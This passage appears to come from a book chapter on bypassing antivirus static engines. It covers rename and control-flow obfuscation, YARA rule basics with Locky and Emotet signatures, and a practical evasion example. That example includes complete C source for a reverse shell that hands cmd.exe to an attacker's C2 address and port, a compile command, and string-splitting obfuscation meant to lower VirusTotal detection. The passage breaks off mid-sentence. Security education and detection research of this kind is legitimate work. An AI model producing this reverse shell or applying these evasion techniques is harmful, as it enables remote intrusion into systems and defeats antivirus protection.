(OOOOO0OOOO0000000 )#line:31
            OOOOOOOOOO0O0O0OO .__OOOO0O00000O0O0O0 +=1 #line:32
        else :#line:33
            for O00OO0OO000OO0OOO in range (OOOOOOOOOO0O0O0OO 
.__OOOO0000O00OO00OO ):#line:35
                if OOOOOOOOOO0O0O0OO .__OOO000OO0000OOOOO 
(OOOOO0OOOO0000000 ,O00O0OOO0O0000O00 ,O00OO0OO000OO0OOO 
):#line:37
                    OOOOO0OOOO0000000 [O00O0OOO0O0000O00 
]=O00OO0OO000OO0OOO #line:38
                    OOOOOOOOOO0O0O0OO .__O00O00O00000O0OOO 
(OOOOO0OOOO0000000 ,O00O0OOO0O0000O00 +1 )#line:39
    def __OOO000OO0000OOOOO (OOOO00OOOOOO00O0O 
,O0OOOOO00OO000OO0 ,OOOOO0OOO0O00O0O0 ,OO0O0OO000OOOOO00 
):#line:42
        ""#line:46
        for O0OOO00OOOO0OOOOO in range (OOOOO0OOO0O00O0O0 
 ):#line:47
            if O0OOOOO00OO000OO0 [O0OOO00OOOO0OOOOO 
]==OO0O0OO000OOOOO00 or O0OOOOO00OO000OO0 [O0OOO00OOOO0OOOOO 
]-O0OOO00OOOO0OOOOO ==OO0O0OO000OOOOO00 -OOOOO0OOO0O00O0O0 
Antivirus bypass using obfuscation     103
or O0OOOOO00OO000OO0 [O0OOO00OOOO0OOOOO ]+O0OOO00OOOO0OOOOO 
==OO0O0OO000OOOOO00 +OOOOO0OOO0O00O0O0 :#line:50
                return False #line:52
        return True #line:53
    def __O0OOOOOOO0O000O0O (O0O0000O0OOO0OO0O 
,OOO000OOOO0O00OO0 ):#line:55
        ""#line:56
        for O0OO0OOO000OOO0OO in range (O0O0000O0OOO0OO0O .__
OOOO0000O00OO00OO ):#line:57
            OO0000OOOO000OO0O =""#line:58
            for OO0O00O0O000O00O0 in range (O0O0000O0OOO0OO0O 
.__OOOO0000O00OO00OO ):#line:59
                if OOO000OOOO0O00OO0 [O0OO0OOO000OOO0OO 
]==OO0O00O0O000O00O0 :#line:60
                    OO0000OOOO000OO0O +="Q "#line:61
                else :#line:62
                    OO0000OOOO000OO0O +=". "#line:63
            print (OO0000OOOO000OO0O )#line:64
        print ("\n")#line:65
    def __OOOOOOO00O0O000OO (O00O000OOOO00OO0O 
,O000O00000OO0O0O0 ):#line:67
        ""#line:71
        OO000O00OO0O00OO0 =""#line:72
        for O00OOOO0O0O0O00OO in range (O00O000OOOO00OO0O .__
OOOO0000O00OO00OO ):#line:73
            OO000O00OO0O00OO0 +=str (O000O00000OO0O0O0 
[O00OOOO0O0O0O00OO ])+" "#line:74
        print (OO000O00OO0O00OO0 )#line:75
def O00O0O0O00OO00OO0 ():#line:77
    ""#line:78
    OO00OOOO0O0O00000 (8 )#line:79
if __name__ =="__main__":#line:81
    O00O0O0O00OO00OO0 ()#line:83 
We highly recommend that before you write your own code and obfuscate it, take the 
preceding example and learn the differences between the regular and the obfuscated code 
to better understand the mechanisms behind it.
Feel free to go to the aforementioned website, where this code is provided.
104     Bypassing the Static Engine
Now that we have understood the concept behind rename obfuscation, let's now 
understand the concept behind control-flow obfuscation.
Control-flow obfuscation
Control-flow obfuscation converts original source code to complicated, unreadable, and 
unclear code. In other words, control-flow obfuscation turns simple code into spaghetti 
code!
For example, here's a comparison between code before control-flow obfuscation 
and the same code after performing control-flow obfuscation (https://
reverseengineering.stackexchange.com/questions/2221/what-is-a-
control-flow-flattening-obfuscation-technique):
Figure 5.2 – Code before and after control-flow obfuscation 
Antivirus bypass using obfuscation     105
When using one of these obfuscation techniques to bypass antivirus software, the engine it 
is bypassing will be the static engine.
To understand specifically why the static engine is the one that is bypassed, we need to 
examine some static signatures. Because this explanation will center on YARA-based 
signatures, it can be helpful to understand a little bit about YARA first to gain a better 
understanding of static signatures.
Introduction to YARA
YARA is an open source cross-platform tool primarily intended to help malware 
researchers to identify and classify malware samples. It offers a rule-based methodology 
for creating malware-type descriptions based on textual and binary patterns. Today, it is 
widely used by security researchers, malware analysts, forensics investigators, incident 
responders, and—of course—by antivirus vendors as part of their detection engines.
From a preliminary glimpse at YARA, you might think it is a simple tool, yet we see YARA 
as one of those things that are genius in their simplicity. This tool is a pattern-matching 
"Swiss army knife" that detects patterns in files and in plain-text memory dumps, using 
prewritten signatures created mostly by security researchers and malware analysts. 
Let's go a little further to gain a better understanding of how YARA pulls this off.
How YARA detects potential malware
YARA is a rule-based pattern-matching tool that, if we write it correctly, can detect 
potential malware and even hunt it on a wider scale. Antivirus software often incorporates 
YARA in its static engines, especially for file-based detections. For example, if malware 
such as the WannaCry ransomware is scanned for malicious and well-known patterns 
by prewritten YARA rules, it can be potentially detected, and the antivirus will prevent it 
from running on the targeted system. 
YARA – the building blocks
YARA rules start with the word rule, followed by the rule name. Generally, rule names 
are descriptive and are based on the malware type and other parameters.
Next, the body of the rules is preceded and followed with curly brackets (braces), as can be 
seen in the rule that follows. The bracketed section of YARA rules includes two important 
subsections: strings and condition.  
106     Bypassing the Static Engine
The strings section will contain the patterns, strings, hexadecimal (hex) values, and 
operation code (opcode) that we want to detect in malicious files. The condition 
section is a logical section that defines the conditions under which the rule will detect or 
match a pattern in a file and deliver a true result. 
The meta section, which appears above the other sections, is optional, and is used to 
describe written rules and explain their purpose.
The following pseudo example will help give you an understanding of each of  
these sections:
rule ExampleRule_02202020
{
    meta:
        description = "Ransomware hunter"
    strings:
        $a1 = {6A 40 68 00 30 00 00 6A 14 7D 92}
        $a2 = "ransomware" nocase
        $c = "Pay us a good amount of ransom" 
    condition:
        1 of $a* and $c
}
This example includes the following elements that make it a basic and correct YARA rule:
1. The name of the rule is defined using the word rule.
2. We have used the meta section to describe the goal of this rule.
3. The strings section defines three variables, each of which provides a potential 
pattern to match and detect in potential malicious files. (Notice that we have used 
the nocase keyword in the $a2 variable so that YARA will match the string 
pattern as case-insensitive.)
4. The condition section defines the conditions that must be met in order to 
consider a file malicious. 
Antivirus bypass using obfuscation     107
Important note
In order to write a good YARA signature, it is very important to check a 
number of variants of the malware that you are trying to hunt and detect. It 
is also crucial to test and ensure that the YARA rule does not give any false 
positives (for example, false detections). 
Now that we understand the basics of YARA, we can turn to exploring how it is used in 
the wild.
YARA signature example – Locky ransomware
In this example, we will see how a YARA signature can detect the Locky ransomware. 
The following code snippet shows a YARA signature that we wrote to detect Locky's 
executable (EXE) file:
rule Locky_02122020
{
    meta:
        description = "Locky ransomware signature"
    strings:
        $DOS_
Header = "!This program cannot be run in DOS mode."
        $a1 = "EncryptFileW"
        $a2 = "AddAce"
        $a3 = "ImmGetContext" nocase 
        $a4 = "g27kkY9019n7t01"
    condition:
        $DOS_Header and all of ($a*)
}
This YARA rule will detect the Locky ransomware by the basic Disk Operating System 
(DOS) header and all of the used strings under the strings section.
To check whether this signature indeed matches and detects the Locky ransomware file, 
we need to execute the following command:
yara   
108     Bypassing the Static Engine
In the following screenshot, you can see that by using a YARA rule, we detected the Locky 
ransomware sample: 
Figure 5.3 – YARA detection of the Locky ransomware
Let's see one more YARA detection-signature example.   
YARA signature example – Emotet downloader
In this case, we will look at the Emotet downloader, which is a Microsoft Word that 
includes malicious Visual Basic for Applications (VBA) macros that will download the 
next stages of the attack. Most of the time, Emotet will download banker's malware that 
is used for downloading other malware as the next stage of the attack. This malware can 
include banking trojans such as TrickBot, IcedID, and more. 
The following code snippet shows a YARA signature that we wrote to detect malicious 
documents containing this VBA macro:
rule Emotet_02122020
{
    meta:
        description = "Emotet 1st stage downloader"
    strings:
        $a1 = "[Content_Types].xml"
        $a2 = "word"
        $a3 = "SkzznWP.wmfPK" nocase
        $a4 = "dSalZH.wmf" 
        $a5 = "vbaProject.bin"
    condition:
        all of them
}
This YARA rule will detect the Emotet malware based on all of the strings used under 
the strings section. 
Antivirus bypass using obfuscation     109
In the following screenshot, you can see that by using a YARA rule, we detected the 
Emotet downloader sample:
Figure 5.4 – YARA detection of the Emotet malware
Now that we have knowledge of how YARA works, let's see how to bypass it.
How to bypass YARA
Bypassing static signatures is dismayingly simple. If a YARA signature is written in a more 
generic way—or even, perhaps, for a specific malware variant, it can be bypassed just 
by modifying and manipulating some strings, and even the code of the malware itself. 
Relying on YARA as the main detection engine is not a good practice, but it is always 
helpful to implement it as an additional layer of detection. 
Static engine bypass – practical example
The following example demonstrates the use of relatively simple code to open a 
Transmission Control Protocol (TCP)-based reverse shell to a Netcat listener based 
on a predefined Internet Protocol (IP) address and port (https://github.com/
dev-frog/C-Reverse-Shell/blob/master/re.cpp):
#include 
#include 
#include 
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
void ExecuteShell(char* C2Server, int C2Port) {
    while(true) {
        SOCKET mySocket;
        sockaddr_in addr; 
        WSADATA version;
110     Bypassing the Static Engine
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_
TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);    
if (WSAConnect(mySocket, 
(SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL 
==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_
BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_
USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.
hStdError = (HANDLE) mySocket;
CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, 
&sinfo, &pinfo); 
                WaitForSingleObject(pinfo.hProcess, INFINITE);
Antivirus bypass using obfuscation     111
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                memset(RecvData, 0, sizeof(RecvData));
               int RecvCode = recv(mySocket, RecvData, DEFAULT_
BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        ExecuteShell(argv[1], port);
    }
    else {
        char host[] = "192.168.1.10";
        int port = 443;
        ExecuteShell(host, port);
    }
    return 0;
}
This code has three functions: main(), which is where the program starts, 
FreeConsole(), which detaches the calling process from its console, and 
ExecuteShell(), which executes the reverse shell. 
112     Bypassing the Static Engine
Next, to compile the code, run the following command:
i686-w64-mingw32-g++ socket.cpp -o before_obfuscation.exe 
-lws2_32 -lwininet -s -ffunction-sections -fdata-sections 
-Wno-write-strings -fno-exceptions -fmerge-all-constants 
-static-libstdc++ -static-libgcc -fpermissive
We uploaded the compiled PE executable to VirusTotal, and we received the following 
detection results:
Figure 5.5 – VirusTotal's detection result of 28/71
These results are fairly high, even for a simple command-line-based reverse shell. 
However, if we obfuscate this code somewhat, we can actually bypass most of these 
antivirus engines. 
Antivirus bypass using obfuscation     113
Here is the first section of the main() function, where our code starts to execute:
Figure 5.6 – The host and port arguments and the Run function after the change
The main function takes two arguments that we pass in the next few lines: the IP address 
of the remote attacker (192.168.1.10), and the remote port of 443, which listens on 
the IP of the attacker (command-and-control (C2/C&C) server).
Next, we define the socket mechanism, as follows:
Figure 5.7 – The ExecuteShell function changed to the Run function 
114     Bypassing the Static Engine
This code is part of the Run() function, changed from the previous suspicious name of 
RunShell(). The Run() function takes two arguments: the host IP, and the listening 
port (443) of the attacker's C2 server. The use of port 443 is less suspicious because it is a 
very widely used and legitimate-seeming port.
First, we use the WSAStartup function to initialize the socket, and then we use the 
inet_addr and htons functions to pass the arguments that will be used as the 
attacker's remote server IP and listening port. Finally, we use the WSAConnect function 
to initiate and execute the connection to the remote attacker's server.
Next is the section of code used to execute the cmd.exe-based shell that we have 
naturally obfuscated, using the simple trick of splitting the string—"cm" and "d.exe", 
which are immediately concatenated into the string of the P variable, instead of using the 
highly suspicious string value "cmd.exe" to evade antivirus detection engines. You can 
see the code here:
Figure 5.8 – After basic obfuscation of cmd.exe 
Antivirus bypass using obfuscation     115
Based on the preceding code, we took the following steps to significantly reduce the 